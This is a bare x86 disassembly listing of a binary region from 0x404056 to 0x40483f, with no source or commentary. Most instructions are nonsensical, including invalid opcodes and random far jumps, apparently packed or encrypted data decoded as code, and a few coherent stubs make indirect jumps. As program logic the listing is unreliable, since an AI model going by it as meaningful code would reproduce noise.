  404056:	add    eax,0xa2120e8c
  40405b:	repnz pop edi
  40405d:	xor    edx,ebx
  40405f:	dec    ecx
  404060:	call   0x9db0:0x5a8ea205
  404067:	addr16 xchg ebx,eax
  404069:	imul   esi,DWORD PTR [ebx-0x16965ccd],0x256d2951
  404073:	outs   dx,BYTE PTR ds:[esi]
  404074:	lds    edx,FWORD PTR ds:[esi+0x4b]
  404078:	aas    
  404079:	jb     0x404091
  40407b:	and    ah,ah
  40407d:	xchg   ebp,eax
  40407e:	mov    ch,0x23
  404080:	or     dl,BYTE PTR [ebx-0x1c]
  404083:	fadd   DWORD PTR [ecx]
  404085:	inc    ecx
  404086:	xchg   edx,eax
  404087:	(bad)  
  404089:	(bad)  
  40408a:	int3   
  40408b:	xchg   ebp,eax
  40408c:	fwait
  40408d:	pop    ebp
  40408e:	jmp    0xcdb52455
  404093:	adc    DWORD PTR [ebx+0x5b],0xffffff9a
  404097:	push   0x34
  404099:	das    
  40409a:	fnstcw WORD PTR [esi]
  40409c:	(bad)  
  40409d:	leave  
  40409e:	inc    edi
  40409f:	xchg   DWORD PTR [edi],edx
  4040a1:	loop   0x4040d0
  4040a3:	xor    DWORD PTR [edx],ebp
  4040a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a6:	inc    edi
  4040a7:	jmp    eax
  4040a9:	add    di,ax
  4040ac:	js     0x404127
  4040ae:	pop    ebp
  4040af:	jecxz  0x4040b3
  4040b1:	pop    esp
  4040b2:	cmp    esi,edi
  4040b4:	mov    ecx,0xe2b00079
  4040b9:	ds ret 0x3bc3
  4040bd:	jecxz  0x4040a5
  4040bf:	jb     0x4040fa
  4040c1:	in     al,0x39
  4040c3:	push   eax
  4040c4:	or     DWORD PTR [edx+0x72],edi
  4040c7:	fldenv [edi+0x1e]
  4040ca:	outs   dx,DWORD PTR ds:[esi]
  4040cb:	lock mov esi,0xb776acef
  4040d1:	test   eax,0xbf8e6a03
  4040d6:	lock dec esi
  4040d8:	mov    ds:0x768b7cdb,eax
  4040dd:	and    esi,edx
  4040df:	aas    
  4040e0:	call   0x92d1a0b4
  4040e5:	sbb    al,0x99
  4040e7:	push   ds
  4040e8:	jae    0x4040d0
  4040ea:	xchg   ebp,eax
  4040eb:	stos   DWORD PTR es:[edi],eax
  4040ec:	(bad)  
  4040ed:	push   esi
  4040ee:	sub    dl,BYTE PTR [edi]
  4040f0:	cmp    eax,0x810441cf
  4040f5:	ins    DWORD PTR es:[edi],dx
  4040f6:	xor    esi,DWORD PTR [edi]
  4040f8:	imul   ebx,DWORD PTR [ebx],0x3b
  4040fb:	enterw 0x80a6,0x9
  404100:	add    BYTE PTR [eax+eiz*2],ch
  404103:	das    
  404104:	dec    edi
  404105:	aad    0xae
  404107:	daa    
  404108:	sub    edx,ecx
  40410a:	(bad)  
  40410b:	ja     0x40417c
  40410d:	daa    
  40410e:	mov    WORD PTR [eax],?
  404110:	dec    ecx
  404111:	mov    al,ds:0x4ee9545b
  404116:	sbb    eax,0xaa18a2d9
  40411b:	or     dh,bl
  40411d:	xchg   edi,eax
  40411e:	jp     0x404125
  404120:	and    eax,0x6dd70161
  404125:	sub    edi,DWORD PTR [eax-0x33]
  404128:	dec    ebx
  404129:	mov    dh,0x20
  40412b:	cmp    ch,BYTE PTR [edi+0x5b]
  40412e:	adc    BYTE PTR [edi],dh
  404130:	xchg   esi,eax
  404131:	sar    DWORD PTR ds:0xe7c83492,cl
  404137:	jo     0x4040e0
  404139:	jmp    0x40411d
  40413b:	sub    esi,DWORD PTR [eax+0x8e2ade2]
  404141:	fidivr DWORD PTR [edi+0x71e4a455]
  404147:	jmp    0x4434:0x6be8060d
  40414e:	sub    al,0x48
  404150:	add    DWORD PTR [eax+0x46c592ca],ebp
  404156:	ins    DWORD PTR es:[edi],dx
  404157:	and    eax,0xaf2d1f89
  40415c:	clc    
  40415d:	mov    ecx,esp
  40415f:	add    edx,DWORD PTR [eax-0x707ebee7]
  404165:	push   ebp
  404166:	stos   BYTE PTR es:[edi],al
  404167:	outs   dx,BYTE PTR ds:[esi]
  404168:	mov    ch,0x95
  40416a:	xchg   edx,eax
  40416b:	repz js 0x404102
  40416e:	into   
  40416f:	mov    BYTE PTR [edx-0x28221a48],cl
  404175:	int    0xee
  404177:	push   0xffffffeb
  404179:	inc    esp
  40417a:	loop   0x4041ec
  40417c:	dec    edx
  40417d:	mov    ch,0xa6
  40417f:	pop    edx
  404180:	das    
  404181:	enterw 0x5510,0xb9
  404186:	jae    0x404197
  404188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404189:	dec    ebx
  40418a:	jmp    0x4041c0
  40418c:	enter  0x83a5,0xa1
  404190:	xlat   BYTE PTR ds:[ebx]
  404191:	jno    0x40416d
  404193:	lods   al,BYTE PTR ds:[esi]
  404195:	shl    BYTE PTR [edx],0x38
  404198:	fmul   DWORD PTR [edi+0x5240360d]
  40419e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40419f:	jge    0x40417e
  4041a1:	in     al,dx
  4041a2:	sbb    edi,DWORD PTR [esi-0x7eae5300]
  4041a8:	dec    ebp
  4041a9:	mov    cs,esi
  4041ab:	pop    edx
  4041ac:	mov    esi,0x51d967e5
  4041b1:	fbstp  TBYTE PTR [ebx+0x47815db3]
  4041b7:	push   0x1a
  4041b9:	add    DWORD PTR [edx+0x488b7518],0x57ad7001
  4041c3:	adc    esp,DWORD PTR [ecx-0x23]
  4041c6:	inc    edx
  4041c7:	pop    ebp
  4041c8:	cmp    dh,ch
  4041ca:	fs scas eax,DWORD PTR es:[edi]
  4041cc:	add    dh,bh
  4041ce:	jmp    0xd73:0xd712080a
  4041d5:	dec    edi
  4041d6:	adc    eax,0x30044abf
  4041db:	jl     0x40419a
  4041dd:	xchg   ebp,eax
  4041de:	dec    esp
  4041df:	push   ecx
  4041e0:	les    edi,FWORD PTR [eax+0x7d]
  4041e3:	dec    ax
  4041e5:	jp     0x4041db
  4041e7:	in     al,0x37
  4041e9:	pushf  
  4041ea:	cmp    eax,edx
  4041ec:	(bad)  
  4041ed:	repz es in eax,0x1d
  4041f1:	xchg   ebx,eax
  4041f2:	loope  0x4041c6
  4041f4:	popa   
  4041f5:	lds    eax,FWORD PTR ss:[ebx-0x55]
  4041f9:	test   DWORD PTR [edx+0x5a1ecaca],ecx
  4041ff:	jo     0x404222
  404201:	xchg   edi,eax
  404202:	xchg   ebx,eax
  404203:	sbb    DWORD PTR [esi+0x61],esi
  404206:	jg     0x404247
  404208:	add    edx,DWORD PTR [edx+0x28]
  40420b:	push   edi
  40420c:	sub    al,0x30
  40420e:	pop    ss
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x47],0x6d
  404248:	ret    
  404249:	sbb    dl,ch
  40424b:	and    eax,0x7d6f7e7e
  404250:	jle    0x4042d0
  404252:	add    DWORD PTR [esi-0x1f],0x70234d6
  404259:	sub    edx,DWORD PTR [esi-0x4603d91b]
  40425f:	jmp    0x40425d
  404261:	dec    ebx
  404262:	add    DWORD PTR [ecx+0x62],ebp
  404265:	xchg   DWORD PTR [esi-0x14],ebp
  404268:	(bad)  
  404269:	aas    
  40426a:	xchg   edi,eax
  40426b:	push   ss
  40426c:	sub    BYTE PTR [edx-0x31],dh
  40426f:	jns    0x40427c
  404271:	pop    edx
  404272:	mov    ebx,0x6bd55a5
  404277:	sahf   
  404278:	cmp    al,0x67
  40427a:	pusha  
  40427b:	stc    
  40427c:	out    dx,eax
  40427d:	les    edi,FWORD PTR [ecx+ebx*4]
  404280:	sub    al,0x22
  404282:	test   DWORD PTR es:[ecx],esp
  404285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404286:	(bad)  
  404287:	out    0xa9,eax
  404289:	inc    esp
  40428a:	pop    ecx
  40428b:	into   
  40428c:	aaa    
  40428d:	jo     0x404299
  40428f:	sbb    BYTE PTR [edx+0x25ac267c],cl
  404295:	mov    BYTE PTR [edi+0x2e],dl
  404298:	shl    DWORD PTR [ebx+0x4b],cl
  40429b:	add    eax,0xf644dd02
  4042a0:	addr16 icebp 
  4042a2:	mov    dl,BYTE PTR ds:0xb5b0de5a
  4042a8:	cs hlt 
  4042aa:	pop    esi
  4042ab:	ret    
  4042ac:	loop   0x4042ee
  4042ae:	fcomi  st,st(0)
  4042b0:	jmp    0x4042dc
  4042b2:	mov    edi,DWORD PTR [edi-0x3b]
  4042b5:	clc    
  4042b6:	(bad)  
  4042b7:	daa    
  4042b8:	sbb    al,0x4d
  4042ba:	add    BYTE PTR [eax],ah
  4042bc:	push   cs
  4042bd:	dec    ebp
  4042be:	fisubr WORD PTR [eax-0x6f931850]
  4042c4:	jge    0x4042ce
  4042c6:	into   
  4042c7:	cmp    DWORD PTR [edx],eax
  4042c9:	outs   dx,DWORD PTR ds:[esi]
  4042ca:	test   al,0x12
  4042cc:	push   esp
  4042cd:	out    dx,eax
  4042ce:	push   ebp
  4042cf:	stc    
  4042d0:	sub    cl,BYTE PTR [eax-0xc9cf059]
  4042d6:	imul   ebx,DWORD PTR [edi-0x37],0x1293a880
  4042dd:	cdq    
  4042de:	add    al,0xcd
  4042e0:	fwait
  4042e1:	xchg   BYTE PTR [esi-0x20fb7019],cl
  4042e7:	div    al
  4042e9:	enter  0x9176,0x4d
  4042ed:	or     ch,bl
  4042ef:	call   0x9b04:0xd86788c5
  4042f6:	addr16 sahf 
  4042f8:	mov    ebx,0xa6353bbd
  4042fd:	mov    BYTE PTR [ecx+0x3dd7a3dc],dh
  404303:	(bad)  
  404304:	(bad)  
  404305:	frstor [edi]
  404307:	xchg   edx,eax
  404308:	dec    ecx
  404309:	fldenv [ebx+0x4ad6aa2c]
  40430f:	jecxz  0x40434c
  404311:	sti    
  404312:	lods   eax,DWORD PTR ds:[esi]
  404313:	mov    esi,0x6c04d415
  404318:	fcom   QWORD PTR [eax-0x2e93a833]
  40431e:	pop    eax
  40431f:	and    ebp,edx
  404321:	stos   BYTE PTR es:[edi],al
  404322:	mov    edi,0xb32bf894
  404327:	mov    edi,0xb16af2b
  40432c:	jmp    0x4042dd
  40432e:	push   edx
  40432f:	nop
  404330:	mov    BYTE PTR [ebx+0x10],cl
  404333:	pop    eax
  404334:	xor    al,0xda
  404336:	push   ecx
  404337:	mov    ecx,0xa1dc11d7
  40433c:	leave  
  40433d:	arpl   WORD PTR [edi-0x2b],si
  404340:	out    dx,al
  404341:	sbb    BYTE PTR [ecx-0x204fc472],ah
  404347:	jmp    0x33790520
  40434c:	pop    ecx
  40434d:	js     0x4043ae
  40434f:	in     eax,0x5d
  404351:	xor    esi,DWORD PTR [esi+0x24]
  404354:	stc    
  404355:	lock popf 
  404357:	add    edx,DWORD PTR [esi+edx*4+0x59]
  40435b:	xchg   ecx,eax
  40435c:	rol    ecx,0x9f
  40435f:	icebp  
  404360:	fs pop esi
  404362:	jns    0x404364
  404364:	cmp    al,0xbb
  404366:	mov    eax,0x63ef913a
  40436b:	xchg   ebp,eax
  40436c:	adc    ebp,DWORD PTR [ebx+0x703f82b9]
  404372:	icebp  
  404373:	mov    BYTE PTR [esi],al
  404375:	pop    edi
  404376:	dec    ebp
  404377:	or     esi,ebp
  404379:	test   DWORD PTR [ecx-0x4b3e3723],0x33b47e36
  404383:	and    BYTE PTR [edx+0x45],ah
  404386:	loopne 0x4043b0
  404388:	sbb    bl,ch
  40438a:	adc    al,0x94
  40438c:	adc    dh,dh
  40438e:	xor    esi,DWORD PTR [eax+0x49]
  404391:	mov    dh,0xfa
  404393:	imul   eax,DWORD PTR [eax],0x3c
  404396:	ins    BYTE PTR es:[edi],dx
  404397:	ret    
  404398:	jo     0x4043a2
  40439a:	jne    0x40434c
  40439c:	mov    edx,0x1e7627eb
  4043a1:	rcl    BYTE PTR [esi-0x14],cl
  4043a4:	xlat   BYTE PTR ds:[ebx]
  4043a5:	loop   0x40439c
  4043a7:	pop    es
  4043a8:	sahf   
  4043a9:	push   ebp
  4043aa:	sub    DWORD PTR [ebp-0x6cd5ded6],ebp
  4043b0:	jo     0x4043a5
  4043b2:	outs   dx,DWORD PTR ds:[esi]
  4043b3:	loop   0x40437d
  4043b5:	pop    edi
  4043b6:	push   ss
  4043b7:	add    al,BYTE PTR [edi+0x1d4562]
  4043bd:	arpl   WORD PTR [ebp+edi*2+0x6f],sp
  4043c1:	push   0xf299638f
  4043c6:	mov    esi,DWORD PTR [eax+0x23]
  4043c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ca:	adc    DWORD PTR [ebp+0x1d],ebp
  4043cd:	retf   
  4043ce:	mov    edi,0x4529e727
  4043d3:	cwde   
  4043d4:	retf   
  4043d5:	adc    al,0x8a
  4043d7:	xchg   edx,edx
  4043d9:	test   DWORD PTR [esi+0x1781e99b],0x806cd696
  4043e3:	test   eax,0xb839e8a7
  4043e8:	sub    dl,BYTE PTR [ebx-0x74]
  4043eb:	shl    BYTE PTR [ebp-0x54],cl
  4043ee:	jo     0x404459
  4043f0:	lock stos DWORD PTR es:[edi],eax
  4043f2:	enter  0xd86a,0x9c
  4043f6:	lods   al,BYTE PTR ds:[esi]
  4043f7:	imul   eax,DWORD PTR ds:0x9a97f1b2,0xc04d7dcc
  404401:	scas   al,BYTE PTR es:[edi]
  404402:	stc    
  404403:	mov    DWORD PTR [ebx+0x1297aa92],0x56a10bf6
  40440d:	sub    al,cl
  40440f:	mov    DWORD PTR [edi-0x51],esi
  404412:	jbe    0x404460
  404414:	mov    ah,0x62
  404417:	jge    0x4043db
  404419:	in     eax,dx
  40441a:	sub    eax,0x97047598
  40441f:	punpckhdq mm7,mm6
  404422:	and    al,BYTE PTR [edx+0x5f]
  404425:	(bad)  
  404426:	jo     0x404479
  404428:	(bad)  
  404429:	mov    ah,0x31
  40442b:	(bad)
  40442e:	sub    ah,BYTE PTR [ecx-0x572228ba]
  404434:	dec    esi
  404435:	data16 cmp al,bl
  404438:	mov    cl,0xb7
  40443a:	(bad)  
  40443b:	jne    0x404484
  40443d:	pop    ds
  40443e:	mov    ds:0xa2d4399e,al
  404443:	inc    esp
  404444:	or     edx,0xffffffb8
  404447:	sbb    edx,DWORD PTR [eax]
  404449:	and    DWORD PTR [esi+0x6],edi
  40444c:	sbb    al,0x8f
  40444e:	mov    al,ds:0xafa70417
  404453:	pop    ss
  404454:	jle    0x4043f3
  404456:	push   edx
  404457:	iret   
  404458:	std    
  404459:	mov    bh,0x73
  40445b:	aad    0xee
  40445d:	outs   dx,DWORD PTR ds:[esi]
  40445e:	pop    edi
  40445f:	dec    ebp
  404460:	mov    ds:0x1343d9a5,al
  404465:	enter  0x3e7,0xe0
  404469:	jns    0x404471
  40446b:	mul    DWORD PTR [ecx+0x6e619e55]
  404471:	(bad)  [ebx]
  404473:	add    BYTE PTR [ebx+0x5ad968ed],ah
  404479:	lds    edx,FWORD PTR [ebx]
  40447b:	aaa    
  40447c:	loope  0x40441c
  40447e:	popa   
  40447f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404480:	rep outs dx,BYTE PTR ds:[esi]
  404482:	sar    BYTE PTR [eax+0x424935ee],1
  404488:	(bad)  [eax+0x65f65806]
  40448e:	call   0x98511678
  404493:	js     0x404419
  404495:	loop   0x4044b4
  404497:	je     0x4044c2
  404499:	adc    BYTE PTR [ebp+0x15],bh
  40449c:	gs mov al,0x15
  40449f:	push   ds
  4044a0:	adc    eax,DWORD PTR [eax]
  4044a2:	test   al,0xbc
  4044a4:	(bad)  
  4044a5:	mov    ebp,0xb77a7e55
  4044aa:	(bad)  
  4044ab:	out    0xb3,eax
  4044ad:	fmulp  st(7),st
  4044af:	cmp    esi,ecx
  4044b1:	aas    
  4044b2:	pop    edi
  4044b3:	sbb    al,0x8c
  4044b5:	aad    0xeb
  4044b7:	aaa    
  4044b8:	or     dh,BYTE PTR [edi-0x33]
  4044bb:	inc    esi
  4044bc:	mov    ch,0x28
  4044be:	xor    DWORD PTR [ebp+0x4c418df1],ebp
  4044c4:	rcr    BYTE PTR [edi-0x52e42991],0x40
  4044cb:	pop    edi
  4044cc:	out    0x8a,eax
  4044ce:	ins    DWORD PTR es:[edi],dx
  4044cf:	call   0x1bdba939
  4044d4:	sub    al,BYTE PTR [edi]
  4044d6:	or     ebx,ebx
  4044d8:	push   ds
  4044d9:	stc    
  4044da:	sub    ecx,DWORD PTR [ebx+0x1d]
  4044dd:	leave  
  4044de:	xlat   BYTE PTR ds:[ebx]
  4044df:	in     al,0xc5
  4044e1:	popf   
  4044e2:	inc    eax
  4044e3:	jl     0x404493
  4044e5:	lahf   
  4044e6:	data16 (bad) 
  4044e8:	faddp  st(4),st
  4044ea:	sbb    al,0x3f
  4044ec:	xchg   ebx,eax
  4044ed:	push   es
  4044ee:	jmp    0xf8c3:0x443d08a3
  4044f5:	lea    esi,[ebx]
  4044f7:	jne    0x40455e
  4044f9:	imul   esi,DWORD PTR [esi+0x292226ad],0xffffff8f
  404500:	xchg   DWORD PTR [edx-0x1c7dc30a],esp
  404506:	and    ebp,0x2b
  404509:	mov    ebp,0x309d46a7
  40450e:	sahf   
  40450f:	(bad)  
  404510:	and    eax,0x52aaf0cd
  404515:	push   edi
  404516:	jae    0x4044e5
  404518:	std    
  404519:	inc    ecx
  40451a:	test   BYTE PTR [ecx-0x2e1c2f80],ch
  404520:	fcmovnbe st,st(7)
  404522:	mov    dl,0x3b
  404524:	imul   ecx,DWORD PTR [edi+0x18a33763],0xfbca61a4
  40452e:	fucom  st(7)
  404530:	(bad)  
  404531:	jnp    0x40457c
  404533:	xor    eax,0xb05fcfc5
  404538:	xchg   BYTE PTR [edx-0x19],bl
  40453b:	fstp   QWORD PTR [esi+0x2]
  40453e:	pusha  
  40453f:	icebp  
  404540:	cmp    dh,bh
  404542:	jne    0x404526
  404544:	das    
  404545:	fwait
  404546:	ds cld 
  404548:	aas    
  404549:	and    ebx,DWORD PTR [ebp+0x247a07d7]
  40454f:	jge    0x404553
  404551:	aam    0x2c
  404553:	xchg   DWORD PTR [eax],edx
  404555:	call   0x52eb:0xf4ba5208
  40455c:	inc    ebp
  40455d:	push   edx
  40455e:	mov    ch,0x56
  404560:	mov    eax,0x1583299c
  404565:	cmp    BYTE PTR [eax-0x7c],bl
  404568:	jne    0x4045a9
  40456a:	ins    DWORD PTR es:[edi],dx
  40456b:	ret    0xf772
  40456e:	stos   DWORD PTR es:[edi],eax
  40456f:	and    eax,0x53a074b9
  404574:	out    dx,eax
  404575:	add    BYTE PTR [ebx+0x46],bh
  404578:	cli    
  404579:	inc    eax
  40457a:	jp     0x404566
  40457c:	loopne 0x4045a5
  40457e:	dec    ecx
  40457f:	jbe    0x40459f
  404581:	dec    edx
  404582:	mov    edi,0x9b8c9769
  404587:	pop    ds
  404588:	sub    al,0x1d
  40458a:	outs   dx,BYTE PTR fs:[esi]
  40458c:	adc    eax,0x7ed3a8c7
  404591:	mov    eax,0x1795959f
  404596:	mov    esi,0x258114ce
  40459b:	mov    al,ds:0x4f3b0e93
  4045a0:	cmp    esp,DWORD PTR [bx-0x54]
  4045a4:	sub    dh,BYTE PTR [ebp+0x12]
  4045a7:	ret    
  4045a8:	or     BYTE PTR [eax+edx*8-0x66],dl
  4045ac:	inc    ebx
  4045ad:	sub    BYTE PTR ds:0xb94589b4,0x12
  4045b4:	mov    ch,0x52
  4045b6:	pop    edx
  4045b7:	and    DWORD PTR [ebp+0x72],ebx
  4045ba:	inc    ebx
  4045bb:	(bad)  
  4045bc:	mov    eax,ds:0x38f447fd
  4045c1:	jns    0x404633
  4045c3:	push   ebx
  4045c4:	mov    ds:0xe4cc68ce,eax
  4045c9:	clc    
  4045ca:	xor    ebp,DWORD PTR [esp+esi*4-0x2b]
  4045ce:	daa    
  4045cf:	mov    ch,0x52
  4045d1:	xchg   ecx,eax
  4045d2:	adc    eax,0xd6ff23bd
  4045d7:	sti    
  4045d8:	inc    ebp
  4045d9:	add    ebx,ebx
  4045db:	inc    edi
  4045dc:	and    DWORD PTR [ecx],0x6d0bd6ca
  4045e2:	and    DWORD PTR [eax+0x3f],esi
  4045e5:	out    0xdb,eax
  4045e7:	ret    0x1bb3
  4045ea:	inc    eax
  4045eb:	cmp    cl,dl
  4045ed:	loope  0x404635
  4045ef:	pop    eax
  4045f0:	pop    ds
  4045f1:	pop    esp
  4045f2:	pusha  
  4045f3:	dec    esp
  4045f4:	or     DWORD PTR [edx+0x8],edx
  4045f7:	adc    BYTE PTR [ecx],bh
  4045f9:	jecxz  0x404674
  4045fb:	pop    esi
  4045fc:	pushf  
  4045fd:	stc    
  4045fe:	int3   
  4045ff:	jno    0x404668
  404601:	idiv   DWORD PTR [esi+edi*4]
  404604:	and    eax,0xbd0c14ca
  404609:	clc    
  40460a:	sbb    al,0x2b
  40460c:	xor    eax,ecx
  40460e:	test   eax,0x38df8c83
  404613:	imul   DWORD PTR [esi-0x5f1df853]
  404619:	jg     0x40465e
  40461b:	mov    bl,0xb5
  40461d:	pop    ds
  40461e:	daa    
  40461f:	cli    
  404620:	and    BYTE PTR [edx+eiz*1+0x66e504a3],0xe2
  404628:	adc    ebx,DWORD PTR [edx]
  40462a:	add    dl,BYTE PTR [eax-0x451eb75f]
  404630:	jmp    0x8e0c614
  404635:	fdivr  QWORD PTR [ebp-0x4de848e7]
  40463b:	pop    ebx
  40463c:	or     al,0x35
  40463e:	test   DWORD PTR [ecx],eax
  404640:	mov    ch,0x9f
  404642:	cmp    edi,edi
  404644:	xor    BYTE PTR [ebp+0x413dc205],cl
  40464a:	add    bh,bh
  40464c:	xor    BYTE PTR [edi+0x534343d3],al
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x4facee3
  404675:	in     al,0xc2
  404677:	and    DWORD PTR [esi+0x7e],edi
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x40469e
  40467f:	lods   eax,DWORD PTR ds:[esi]
  404680:	stos   DWORD PTR es:[edi],eax
  404681:	int3   
  404682:	fs jl  0x4046ca
  404685:	jnp    0x4046ab
  404687:	push   eax
  404688:	jne    0x4046b8
  40468a:	fs in  eax,dx
  40468c:	add    dl,BYTE PTR [esi+eax*8-0x3d]
  404690:	clc    
  404691:	cmp    BYTE PTR [ebx-0x9],bl
  404694:	ss xchg esp,eax
  404696:	mov    cl,0x5d
  404698:	pop    es
  404699:	dec    esi
  40469a:	cdq    
  40469b:	and    eax,0x7e303010
  4046a0:	mov    edi,ebp
  4046a2:	push   eax
  4046a3:	sub    DWORD PTR [eax+0x24cfadc2],0x5a02e372
  4046ad:	inc    edi
  4046ae:	push   ds
  4046af:	sbb    ah,bl
  4046b1:	inc    esi
  4046b2:	je     0x404661
  4046b4:	cmp    ch,BYTE PTR [eax+0x408824cb]
  4046ba:	xchg   ebp,eax
  4046bb:	aas    
  4046bc:	call   0xb3d2:0xf2f5cce2
  4046c3:	je     0x404731
  4046c5:	or     ebp,DWORD PTR [edx]
  4046c7:	daa    
  4046c8:	test   ch,ch
  4046ca:	jbe    0x40469c
  4046cc:	ins    BYTE PTR es:[edi],dx
  4046cd:	cmp    DWORD PTR [edx+0x70],edx
  4046d0:	clc    
  4046d1:	mov    dl,0x3c
  4046d3:	fiadd  DWORD PTR [eax-0x188c8469]
  4046d9:	ret    0xcb41
  4046dc:	adc    cl,bh
  4046de:	into   
  4046df:	or     BYTE PTR [edx-0x66],dh
  4046e2:	dec    esi
  4046e3:	das    
  4046e4:	pop    ebx
  4046e5:	pop    es
  4046e6:	ins    BYTE PTR es:[edi],dx
  4046e7:	scas   al,BYTE PTR es:[edi]
  4046e8:	into   
  4046e9:	ins    BYTE PTR es:[edi],dx
  4046ea:	test   BYTE PTR [ebp-0x648e2c27],cl
  4046f0:	repz out 0x87,al
  4046f3:	xor    eax,0xb1e3e2f
  4046f8:	ret    0x56f9
  4046fb:	mov    ch,0x45
  4046fd:	mov    ah,BYTE PTR [edi-0x1cb22606]
  404703:	lods   eax,DWORD PTR ds:[esi]
  404704:	jno    0x404693
  404706:	sub    dh,BYTE PTR [edx-0x22438337]
  40470c:	int    0x89
  40470e:	pop    edi
  40470f:	mul    DWORD PTR [eax]
  404711:	and    BYTE PTR [ebx-0x4317cb00],dl
  404717:	adc    DWORD PTR [esi-0x37c930f2],ecx
  40471d:	enter  0xb2a6,0x7e
  404721:	xchg   esp,eax
  404722:	jmp    0x1f76:0x3daf3b58
  404729:	shr    DWORD PTR [ecx-0x57],cl
  40472c:	inc    edx
  40472d:	call   0xc33a8353
  404732:	mov    al,0xbe
  404734:	arpl   WORD PTR [edi-0x56],di
  404737:	mov    dh,0x53
  404739:	xor    DWORD PTR [ecx-0x5d0b9b2e],ebx
  40473f:	stc    
  404740:	rep outs dx,DWORD PTR gs:[esi]
  404743:	aas    
  404744:	fs mov es,ebp
  404747:	(bad)  
  404749:	dec    esi
  40474a:	shl    DWORD PTR [ebx],0x66
  40474d:	xchg   ebx,eax
  40474e:	(bad)  
  40474f:	aam    0x75
  404751:	cmp    ah,ch
  404753:	pop    ebx
  404754:	stos   BYTE PTR es:[edi],al
  404755:	bound  edi,QWORD PTR [edx+0x458cd59a]
  40475b:	retf   0xbc8e
  40475e:	clc    
  40475f:	xchg   DWORD PTR [edi-0x61281da2],ebx
  404765:	stos   DWORD PTR es:[edi],eax
  404766:	lds    ecx,FWORD PTR [edx]
  404768:	or     DWORD PTR [edi+0x7f],ecx
  40476b:	or     ch,BYTE PTR [ebx]
  40476d:	sub    eax,0xffe0c0f4
  404772:	jp     0x40474f
  404774:	add    DWORD PTR [edx+0x2f],edx
  404777:	and    eax,0x893b6851
  40477c:	mov    ecx,DWORD PTR [ecx+ebx*1]
  40477f:	sub    dh,0x86
  404782:	add    BYTE PTR [eax-0x3b7cb790],ch
  404788:	lock fiadd WORD PTR [eax-0x66979f0f]
  40478f:	or     BYTE PTR [edi-0x704781f],bh
  404795:	push   es
  404796:	pop    ebx
  404797:	cmp    dl,BYTE PTR [ebx+0x79]
  40479a:	pop    ds
  40479b:	sbb    al,0x58
  40479d:	sub    ch,al
  40479f:	cdq    
  4047a0:	mov    al,ds:0xb427399f
  4047a5:	dec    esp
  4047a6:	stos   BYTE PTR es:[edi],al
  4047a7:	scas   al,BYTE PTR es:[edi]
  4047a8:	std    
  4047a9:	sbb    DWORD PTR [edi-0x25],eax
  4047ac:	xchg   ebx,eax
  4047ad:	dec    esi
  4047ae:	pop    es
  4047af:	cmp    cl,al
  4047b1:	(bad)  
  4047b2:	popa   
  4047b3:	mov    cl,0xe4
  4047b5:	adc    al,0xd7
  4047b7:	sar    BYTE PTR [ecx-0x275d1fe5],0xe0
  4047be:	loope  0x40480f
  4047c0:	pushf  
  4047c1:	and    eax,0x3087bd4d
  4047c6:	cmp    al,dl
  4047c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c9:	push   cs
  4047ca:	push   ebx
  4047cb:	xor    eax,0x40e6300b
  4047d0:	addr16 sahf 
  4047d2:	fcomp  DWORD PTR [esi]
  4047d4:	and    esp,eax
  4047d6:	data16 xlat BYTE PTR ds:[ebx]
  4047d8:	js     0x4047e7
  4047da:	leave  
  4047db:	in     eax,0x90
  4047dd:	pop    DWORD PTR [ecx]
  4047df:	sahf   
  4047e0:	nop
  4047e1:	mov    esi,0x9d74d1d3
  4047e6:	out    dx,eax
  4047e7:	and    eax,0xe9afb792
  4047ec:	dec    esi
  4047ed:	sbb    BYTE PTR gs:[edi-0x48],dl
  4047f1:	adc    BYTE PTR [ebx],al
  4047f3:	ds jo  0x404782
  4047f6:	cmp    dh,BYTE PTR [eax+esi*2-0x37]
  4047fa:	inc    ecx
  4047fb:	test   eax,0x787abb7f
  404800:	dec    ebx
  404801:	xchg   BYTE PTR [esi],cl
  404803:	sub    eax,0x2631cb5b
  404808:	jbe    0x4047f5
  40480a:	fldcw  WORD PTR [eax+0x493b5429]
  404810:	pop    es
  404811:	or     ebx,ebp
  404813:	add    al,0xa9
  404815:	in     al,dx
  404816:	sub    al,0x33
  404818:	and    dh,bl
  40481a:	pop    ds
  40481b:	lods   eax,DWORD PTR ds:[esi]
  40481c:	mov    dh,0xa4
  40481e:	jo     0x4047c6
  404820:	stc    
  404821:	sbb    eax,0xf3979a54
  404826:	fucom  st(3)
  404828:	push   ds
  404829:	adc    bh,dl
  40482b:	call   0x5f3d877e
  404830:	sbb    ebx,esp
  404832:	jns    0x4047ff
  404834:	(bad)  
  404835:	gs stos BYTE PTR es:[edi],al
  404837:	lds    edi,FWORD PTR [ecx]
  404839:	sub    DWORD PTR [esi],esi
  40483b:	sbb    DWORD PTR [edx-0x52],ebx
  40483e:	lods   al,BYTE PTR ds:[esi]
  40483f:	or     eax,0x3cc7587a
